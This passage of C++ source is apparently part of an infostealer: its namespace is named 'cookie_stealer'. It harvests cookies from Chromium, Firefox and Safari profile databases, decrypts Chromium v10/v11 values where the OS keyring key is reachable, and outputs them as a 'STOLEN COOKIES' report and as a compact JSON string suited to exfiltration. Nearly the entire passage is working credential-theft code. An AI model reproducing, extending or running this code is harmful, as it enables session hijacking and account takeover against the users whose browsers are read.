        if (cookie.value.empty() && cookie.sealed_reason.empty()) continue;
        out.push_back(cookie);
    }
    return out;
}

#else  // POSIX

inline std::vector<Cookie> unseal_chromium(const std::vector<unsigned char>& db,
                                           const std::string& browser,
                                           const std::string& profile,
                                           const std::string& user_data) {
    (void)user_data;
    Table table = read_table(db, "cookies");
    std::vector<Cookie> out;
    for (const Row& row : table.rows) {
        std::string name = row.text("name");
        if (name.empty()) continue;
        Cookie cookie;
        cookie.browser = browser;
        cookie.profile = profile;
        cookie.host = lowercase(row.text("host_key"));
        cookie.name = name;
        cookie.path = row.text("path");
        if (cookie.path.empty()) cookie.path = "/";
        cookie.value = row.text("value");
        std::string expires = row.text("expires_utc");
        if (!expires.empty()) {
            cookie.has_expires = true;
            cookie.expires_utc = std::atoll(expires.c_str());
        }
        if (cookie.value.empty()) {
            std::vector<unsigned char> blob = row.blob("encrypted_value");
            if (!blob.empty()) {
                if (blob.size() > 3 && std::memcmp(blob.data(), "v20", 3) == 0) {
                    cookie.sealed_reason = "app-bound (v20)";
                } else if (blob.size() > 3 &&
                           (std::memcmp(blob.data(), "v10", 3) == 0 ||
                            std::memcmp(blob.data(), "v11", 3) == 0)) {
#if PHANTOM_COOKIE_HAVE_OPENSSL
                    std::vector<unsigned char> plain;
                    if (linux_oscrypt_open(blob.data() + 3, blob.size() - 3,
                                           plain)) {
                        cookie.value.assign(plain.begin(), plain.end());
                    } else {
                        cookie.sealed_reason = "keyring key unavailable";
                    }
#else
                    // v10/v11 are sealed with the browser's OS keystore key.
                    // Without it the honest answer is "sealed", never a guess.
                    cookie.sealed_reason = "os keystore key unavailable";
#endif
                }
            }
        }
        if (cookie.value.empty() && cookie.sealed_reason.empty()) continue;
        out.push_back(cookie);
    }
    return out;
}

#endif

// ── collection ─────────────────────────────────────────────────────────────

inline std::vector<Cookie> steal_cookies() {
    std::vector<Cookie> out;
    std::vector<unsigned char> db;

    for (const Target& target : chromium_targets()) {
        db.clear();
        if (!read_file(target.db_path, db)) continue;
        std::vector<Cookie> cookies =
            unseal_chromium(db, target.browser, target.profile, target.user_data);
        out.insert(out.end(), cookies.begin(), cookies.end());
    }

    for (const Target& target : gecko_targets()) {
        db.clear();
        if (!read_file(target.db_path, db)) continue;
        Table table = read_table(db, "moz_cookies");
        std::vector<Cookie> cookies = gecko_rows_to_cookies(table, target.profile);
        out.insert(out.end(), cookies.begin(), cookies.end());
    }

    for (const Target& target : safari_targets()) {
        db.clear();
        if (!read_file(target.db_path, db)) continue;
        std::vector<Cookie> cookies = safari_cookies(db);
        out.insert(out.end(), cookies.begin(), cookies.end());
    }

    return out;
}

inline std::string format_cookies() {
    std::vector<Cookie> cookies = steal_cookies();
    if (cookies.empty()) {
        return "No cookies found. No supported browser profile was readable "
               "(or every value is sealed with a key this context cannot "
               "reach).";
    }

    std::ostringstream out;
    out << "=== STOLEN COOKIES (" << cookies.size() << ") ===\n";
    for (const Cookie& cookie : cookies) {
        out << "Browser: " << cookie.browser;
        if (!cookie.profile.empty()) out << " [" << cookie.profile << "]";
        out << "\n";
        out << "Host: " << cookie.host << "\n";
        out << "Name: " << cookie.name << "\n";
        out << "Path: " << cookie.path << "\n";
        if (!cookie.value.empty()) {
            out << "Value: " << cookie.value << "\n";
        } else {
            out << "Value: <sealed: " << cookie.sealed_reason << ">\n";
        }
        if (cookie.has_expires) {
            time_t secs = (time_t)(cookie.expires_utc / 1000000 - 11644473600LL);
            char timebuf[32];
            struct tm tmbuf;
#ifdef _WIN32
            localtime_s(&tmbuf, &secs);
#else
            localtime_r(&secs, &tmbuf);
#endif
            strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", &tmbuf);
            out << "Expires: " << timebuf << "\n";
        }
        out << "---\n";
    }
    return out.str();
}

inline std::string format_cookies_json() {
    std::vector<Cookie> cookies = steal_cookies();
    if (cookies.empty()) return "COOKIES:[]";

    auto escape = [](const std::string& value) {
        std::string out;
        for (char ch : value) {
            if (ch == '"') out += "\\\"";
            else if (ch == '\\') out += "\\\\";
            else if (ch == '\n') out += "\\n";
            else if (ch == '\r') out += "\\r";
            else if (ch == '\t') out += "\\t";
            else out += ch;
        }
        return out;
    };

    std::ostringstream out;
    out << "COOKIES:[";
    bool first = true;
    for (const Cookie& cookie : cookies) {
        if (!first) out << ",";
        first = false;
        out << "{\"host\":\"" << escape(cookie.host)
            << "\",\"name\":\"" << escape(cookie.name)
            << "\",\"path\":\"" << escape(cookie.path)
            << "\",\"value\":\"" << escape(cookie.value)
            << "\",\"browser\":\"" << escape(cookie.browser)
            << "\",\"profile\":\"" << escape(cookie.profile) << "\"}";
    }
    out << "]";
    return out.str();
}

}  // namespace cookie_stealer
